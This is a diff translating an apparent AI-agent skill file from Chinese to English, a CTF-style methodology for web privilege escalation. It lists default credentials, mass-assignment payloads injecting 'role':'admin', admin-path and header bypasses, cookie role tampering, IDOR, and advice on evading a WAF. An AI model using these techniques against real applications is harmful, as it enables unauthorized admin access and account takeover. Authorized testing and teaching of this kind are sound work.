@@ -1,61 +1,66 @@
 ---
 name: privilege-escalation-web
-description: "Web 应用层权限提升。当 Web 应用存在用户注册/登录、角色权限管理、API 参数传输用户身份信息时使用。覆盖 Mass Assignment（批量赋值）攻击、角色/权限字段注入、HTTP 方法/Header 绕过、Cookie/Session 篡改。注册后立即检查普通用户能否越权访问管理员功能——这是第一优先级"
+description: "Web application layer privilege escalation. Use when a web application has user registration/login, role and permission management, or API parameters carrying user identity information. Covers Mass Assignment attacks, role/permission field injection, HTTP method/header bypass, and cookie/session tampering. Immediately after registration, check whether a normal user can reach admin functionality via broken access control — this is the first priority"
+zh-signals: "Web 应用层权限提升，覆盖 Mass Assignment、角色/权限字段注入、HTTP 方法/Header 绕过与 Cookie/Session 篡改。信号:越权,Mass Assignment,角色注入,权限绕过,Session篡改,RBAC"
+when-to-use: >-
+  Use when a web application has user registration/login, role-based access control, or
+  API parameters carrying user identity, and you need to test mass assignment, role
+  injection, header bypass, or cookie/session tampering for privilege escalation.
 metadata:
-  tags: "privilege_escalation,mass_assignment,authorization,role-tampering,default_credentials,权限提升,越权,批量赋值,RBAC,admin bypass,角色,权限绕过"
+  tags: "privilege_escalation,mass_assignment,authorization,role-tampering,default_credentials,broken_access_control,RBAC,admin bypass,privilege_bypass"
   category: "exploit"
 ---
 
-# Web 权限提升方法论
+# Web Privilege Escalation Methodology
 
-Web 权限提升和系统提权不同——不需要 exploit，只需要找到应用逻辑中的权限检查漏洞。
+Web privilege escalation differs from system privilege escalation — it requires no exploit, only finding flaws in the application's authorization checks.
 
-## ⛔ 深入参考（必读）
+## ⛔ Further Reading (Must Read)
 
-- Mass Assignment 字段清单、HTTP Header 篡改、Cookie 篡改 → [references/web-privesc-techniques.md](references/web-privesc-techniques.md)
+- Mass Assignment field list, HTTP header tampering, cookie tampering → [references/web-privesc-techniques.md](references/web-privesc-techniques.md)
 
-## Phase 1: 认证和账户发现
+## Phase 1: Authentication and Account Discovery
 
-### 默认凭据（最快路径）
+### Default Credentials (Fastest Path)
 ```
 admin:admin, admin:password, admin:123456
 root:root, root:toor, test:test, guest:guest
 ```
 
-### 注册功能分析
-注册新账户，用代理拦截请求，记录请求格式、发送字段、响应字段（可能暴露隐藏字段名）。
-检查 `/docs`, `/swagger`, `/openapi.json`。
+### Registration Function Analysis
+Register a new account, intercept the request with a proxy, and record the request format, the fields sent, and the response fields (hidden field names may be exposed).
+Check `/docs`, `/swagger`, `/openapi.json`.
 
-## Phase 2: Mass Assignment（核心技术）
+## Phase 2: Mass Assignment (Core Technique)
 
-在注册或更新请求中**添加应用未预期的字段**（每次只加一个）：
+In registration or update requests, **add fields the application does not expect** (only one at a time):
 ```json
 {"username":"test", "password":"pass", "role":"admin"}
 {"username":"test", "password":"pass", "is_admin":true}
 {"username":"test", "password":"pass", "is_staff":1}
 ```
 
-→ 完整字段清单和框架惯例 → [references/web-privesc-techniques.md](references/web-privesc-techniques.md)
+→ full field list and framework conventions → [references/web-privesc-techniques.md](references/web-privesc-techniques.md)
 
-## Phase 3: 管理端点直接访问
+## Phase 3: Direct Access to Admin Endpoints
 ```
-GET /admin → 403? → 试 /admin/ (trailing slash) 或 /Admin (大小写)
+GET /admin → 403? → try /admin/ (trailing slash) or /Admin (case variation)
 GET /api/admin/users → 200?
 ```
 
-## Phase 4: HTTP 方法/Header 篡改 + Cookie 篡改
+## Phase 4: HTTP Method/Header Tampering + Cookie Tampering
 
 ```
-GET /admin/flag → 403 → 试 POST/PUT/PATCH
+GET /admin/flag → 403 → try POST/PUT/PATCH
 Header: X-Original-URL: /admin/flag / X-Forwarded-For: 127.0.0.1
 Cookie: role=user → role=admin / admin=0 → admin=1
 ```
-→ 完整 payload 和 Flask session 伪造 → [references/web-privesc-techniques.md](references/web-privesc-techniques.md)
+→ full payloads and Flask session forgery → [references/web-privesc-techniques.md](references/web-privesc-techniques.md)
 
-## Phase 5: 对象级越权
-修改 URL/参数中的 ID 访问他人资源
+## Phase 5: Object-Level Broken Access Control
+Modify the ID in the URL/parameters to access another user's resources
 
-## 注意事项
-- Mass Assignment 每次只改一个字段——全改可能触发 WAF
-- 注册后检查 `GET /api/users/me` 确认权限是否真的变了
-- 结合 IDOR + Mass Assignment 效果更好
+## Notes
+- With Mass Assignment change only one field at a time — changing all of them may trigger a WAF
+- After registration, check `GET /api/users/me` to confirm whether privileges really changed
+- Combining IDOR with Mass Assignment works better
